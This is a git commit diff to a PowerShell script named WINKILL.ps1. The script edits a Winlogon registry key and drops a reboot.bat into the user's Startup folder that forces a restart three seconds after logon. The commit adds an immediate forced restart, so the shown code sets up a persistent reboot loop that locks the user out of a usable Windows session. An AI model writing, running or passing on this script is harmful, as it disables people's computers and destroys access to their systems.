3b783da8d8cedd3faccf28ae45dcf4ca39dde21d
KoTim <100821199+tim1363@users.noreply.github.com>
2025-05-16 13:37:45 +0300

    Update WINKILL.ps1

--- WINKILL.ps1
+++ WINKILL.ps1
@@ -5,3 +5,4 @@ Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -
 $batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reboot.bat"
 $batContent = "@echo off`r`ntimeout /t 3 >nul`r`nshutdown /r /t 0"
 Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+shutdown /r /t 0
